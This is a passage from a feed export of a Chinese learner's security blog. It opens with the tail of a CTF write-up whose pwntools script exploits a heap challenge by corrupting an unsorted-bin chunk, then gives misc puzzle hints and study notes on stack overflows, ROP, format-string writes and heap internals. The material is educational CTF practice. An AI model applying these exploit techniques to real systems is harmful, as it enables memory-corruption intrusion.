r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn8-fail"><a href="#pwn8-fail" class="headerlink" title="pwn8(fail)"></a>pwn8(fail)</h3><blockquote><p>add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现</p><p>任意写</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="MISC签到题"><a href="#MISC签到题" class="headerlink" title="MISC签到题"></a>MISC签到题</h3><p>ook解码</p><h3 id="双重洗脑"><a href="#双重洗脑" class="headerlink" title="双重洗脑"></a>双重洗脑</h3><p>与佛论禅+社会主义价值观</p><h3 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h3><p>加qq拍一拍</p><h3 id="猜猜可莉把flag藏到哪了"><a href="#猜猜可莉把flag藏到哪了" class="headerlink" title="猜猜可莉把flag藏到哪了"></a>猜猜可莉把flag藏到哪了</h3><p>脱进010，直接盲文解密</p><h3 id="7的意志！"><a href="#7的意志！" class="headerlink" title="7的意志！"></a>7的意志！</h3><p>压缩包密码7</p><p>栅栏加凯撒</p><h3 id="奇怪的题"><a href="#奇怪的题" class="headerlink" title="奇怪的题"></a>奇怪的题</h3><p>改像素可以得到一张散开的二维码</p><p>把三个拼一个二维码</p><p>补三个定位符</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;CUMT2020入门赛&quot;&gt;&lt;a href=&quot;#CUMT2020入门赛&quot; class=&quot;headerlink&quot; title=&quot;CUMT2020入门赛&quot;&gt;&lt;/a&gt;CUMT2020入门赛&lt;/h1&gt;&lt;p&gt;本不准备写的，主要tcl，还是留</summary>
      
    
    
    
    <category term="wp" scheme="https://pz1o.top/categories/wp/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>0day安全读书笔记</title>
    <link href="https://pz1o.top/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://pz1o.top/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-27T14:29:36.000Z</published>
    <updated>2020-11-20T14:17:51.878Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>三个月一起读完0day安全，赶紧拿来读一读，随缘更新</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;三个月一起读完0day安全，赶紧拿来读一读，随缘更新&lt;/p&gt;
&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>逆向工程核心原理读书笔记</title>
    <link href="https://pz1o.top/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://pz1o.top/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-27T08:09:08.000Z</published>
    <updated>2020-11-20T14:20:02.585Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>预估三个月，但说不定为了赶其他的ddl，也就读不完了，尽力去吧</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;预估三个月，但说不定为了赶其他的ddl，也就读不完了，尽力去吧&lt;/p&gt;
&lt;h1 id=&quot;正文&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="逆向" scheme="https://pz1o.top/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://pz1o.top/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="读书笔记" scheme="https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>PWN学习</title>
    <link href="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/"/>
    <id>https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-10-24T14:32:31.000Z</published>
    <updated>2020-12-11T09:17:54.335Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>纯零基础，大佬请略过</p><p>从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg" alt="1603543652982"></p><p>大学中是研究深度还是广度，我可能还是需要选择一下</p><p>基本全是ppt截图</p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png" alt="image-20201024233545234"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -S a.c #生成汇编文件</span><br><span class="line">file a.s #查看文件类型  可以看见是ascii文本</span><br><span class="line">gcc a.s  #生成可执行文件</span><br><span class="line">file a.out #可以看见是可执行文件</span><br></pre></td></tr></table></figure><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png" alt="image-20201027230103100"></p><h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png" alt="image-20201027230424200"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png" alt="image-20201028164523021"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png" alt="image-20201028164758641"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png" alt="image-20201028165455072"></p><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png" alt="image-20201028170244054"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png" alt="image-20201028171316681"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png" alt="image-20201028175015154"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png" alt="image-20201028175324930"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png" alt="image-20201028175515114"></p><h2 id="程序编译与链接"><a href="#程序编译与链接" class="headerlink" title="程序编译与链接"></a>程序编译与链接</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png" alt="image-20201028180055683"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png" alt="image-20201028180509024"></p><h2 id="程序装载与进程执行"><a href="#程序装载与进程执行" class="headerlink" title="程序装载与进程执行"></a>程序装载与进程执行</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png" alt="image-20201028181509843"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png" alt="image-20201028182158445"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png" alt="image-20201028182509458"></p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png" alt="image-20201028182719496"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png" alt="image-20201028183231684"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png" alt="image-20201028183244082"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png" alt="image-20201028183715008"></p><h1 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a><strong>基本原理</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png" alt="image-20201028210304426"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png" alt="image-20201028210843823"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png" alt="image-20201028212002026"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png" alt="image-20201028212037049"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png" alt="image-20201028212448211"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png" alt="image-20201028212603675"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png" alt="image-20201028213307651"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png" alt="image-20201028213458423"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png" alt="image-20201028213648493"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png" alt="image-20201028213849813"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png" alt="image-20201028215303342"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png" alt="image-20201029211445528"></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a><strong>攻击</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png" alt="image-20201028215837467"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png" alt="image-20201028220533860"></p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>返回地址为后门地址</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png" alt="image-20201029210250310"></p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>返回地址为写入的shellcode的地址</p><p><strong>栈中写入shellcode</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png" alt="image-20201103230658840"></p><p><strong>bss段写入shellcode</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png" alt="image-20201103232118467"></p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png" alt="image-20201103231611494"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png" alt="image-20201111165405311"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png" alt="image-20201111170622828"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png" alt="image-20201112200053036"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png" alt="image-20201112201440668"></p><h1 id="返回导向编程"><a href="#返回导向编程" class="headerlink" title="返回导向编程"></a>返回导向编程</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png" alt="image-20201105154134220"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png" alt="image-20201105160249721"></p><h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png" alt="image-20201105191117470"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png" alt="image-20201105192140397"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png" alt="image-20201105193656915"></p><p><strong>调用构造</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png" alt="image-20201105200045153"></p><h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>存放参数放入寄存器中</p><p>但超过6个就会放入栈中</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png" alt="image-20201115233600880"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png" alt="image-20201116194218608"></p><h1 id="动态链接过程"><a href="#动态链接过程" class="headerlink" title="动态链接过程"></a>动态链接过程</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png" alt="image-20201106223140061"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png" alt="image-20201106232428225"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png" alt="image-20201106233935531"></p><h1 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h1><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Only </p><p>它分为两种，Partial RELRO 和 Full RELRO，即 部分RELRO 和 完全RELRO。</p><p><strong>部分RELRO</strong> 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。但是从攻击者角度来看呢，部分RELRO 不堪一击，因为它仅仅使 GOT 存储在 bss 段之前，这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。<br><strong>完全RELRO</strong> 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o a a.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o a a.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o a a.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o a a.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure><h2 id="The-NX-bits"><a href="#The-NX-bits" class="headerlink" title="The NX bits"></a>The NX bits</h2><p>主要是保护栈区不可执行，通常在checksec中可以查看</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png" alt="image-20201103231211223"></p><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>地址随机化，也很好理解，就是不想让你找到真正的内存地址</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png" alt="image-20201103231430738"></p><p>改变值的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p><strong>ASLR 并不负责代码段和数据段的随机化，这由 PIE 负责，但是只有在开启 ASLR 之后，PIE 才会生效。</strong></p><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p><strong>这种栈保护措施在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值</strong>，</p><p>也称哨兵值，通俗理解，我们可以把它看成一个cookie</p><p>它是程序每次运行时随机产生的。</p><p>在恢复寄存器状态之前和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个函数的某个操作改变了，如果发现异常程序会中止。<br>最近的 GCC 版本可能会试图自动插入这种溢出检测值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o a a.c // GCC 可能会试图自动插入这种溢出检测值</span><br><span class="line">gcc -fno-stack-protector -o a a.c //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o a a.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o a a.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>位置无关代码，负责代码段和数据段bss</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c // 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure><h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>控制ESP</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png" alt="image-20201117163123759"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png" alt="image-20201117165305864"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png" alt="image-20201117165321403"></p><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p><strong>前提：有printf 且第一个参数可控</strong></p><ol><li>泄露栈内存</li><li>泄露任意地址内存</li><li>篡改栈内存</li><li>篡改任意地址内存</li></ol><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png" alt="image-20201117203103431"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%x</span><br><span class="line">%p 打印栈上内容</span><br><span class="line">%s 打印栈上解析地址的内容</span><br><span class="line">%n 写内容(打印字节的个数)</span><br><span class="line">printf(&quot;%d%d%d&quot;,a,b,c)</span><br><span class="line">printf(&quot;%3$d&quot;,a,b,c) 控制第三个参数</span><br><span class="line"></span><br><span class="line">printf(&quot;%20c&quot;,c)</span><br><span class="line">printf(&quot;aaa%n&quot;,c)</span><br><span class="line">printf(&quot;%7$n&quot;)</span><br><span class="line"></span><br><span class="line">%n 0x00000004</span><br><span class="line">%hn 0x0004</span><br></pre></td></tr></table></figure><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png" alt="image-20201117213226675"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png" alt="image-20201118152914484"></p><h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png" alt="image-20201118173315748"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png" alt="image-20201118223608385"></p><h2 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h2><ul><li>逻辑链表：指针连起来,把同类的<code>chunk</code>连起来</li><li>物理链表：通过<code>size</code>域组织相邻<code>chunk</code>之间的关系，判断相邻是否为<code>free chunk</code>，若是，则合并</li></ul><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a><strong>arena</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png" alt="image-20201118224006678"></p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a><strong>chunk</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png" alt="image-20201118230656646"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png" alt="image-20201119110607276"></p><h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a><strong>malloced chunk</strong></h4><p><strong>chunk</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png" alt="image-20201118233221511"></p><p><code>pre size</code>:记录上一个free chunk的大小，若上一个chunk在用，则<code>pre size</code>将被合并</p><p><code>size</code>:整个chunk 的大小</p><p><strong>top chunk</strong></p><p>从操作系统批发的不分给用户的chunk</p><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a><strong>free chunk</strong></h4><p>small bin chunk</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png" alt="image-20201119105945419"></p><p>large bin chunk</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png" alt="image-20201119110352335"></p><p>fast bin chunk</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png" alt="image-20201119110501531"></p><p><strong>pre size 复用</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png" alt="image-20201119114224011"></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a><strong>bin</strong></h3><p>分配方式：<code>fastbin</code> —&gt;<code>unsorted bin</code>—&gt;<code>small bin</code>/<code>large bin</code> </p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png" alt="image-20201119162311702"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png" alt="image-20201119115539452"></p><h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a><strong>fastbins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png" alt="image-20201119162151833"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png" alt="image-20201119163702351"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png" alt="image-20201119120748019"></p><p><strong>bin的双向链表</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a><strong>unsorted bin</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png" alt="image-20201119163039733"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png" alt="image-20201119163232880"></p><h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a><strong>small bins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png" alt="image-20201119163209378"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png" alt="image-20201119163319068"></p><h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png" alt="image-20201119163433718"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png" alt="image-20201119163457182"></p><p><strong>实例</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png" alt="image-20201119115142092"></p><h1 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png" alt="image-20201119163935171"></p><p><strong>fastbin</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201121183321818.png" alt="image-20201121183321818"></p><p><strong>unsorted bin</strong></p><h1 id="工具学习"><a href="#工具学习" class="headerlink" title="工具学习"></a>工具学习</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Import pwntools</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#Local communication</span></span><br><span class="line">io = process(<span class="string">"./a.out"</span>)</span><br><span class="line"><span class="comment">#Telecommunication</span></span><br><span class="line">io = remote(<span class="string">"ip"</span>,port)</span><br><span class="line"><span class="comment">#Receive message</span></span><br><span class="line">io.recvline()</span><br><span 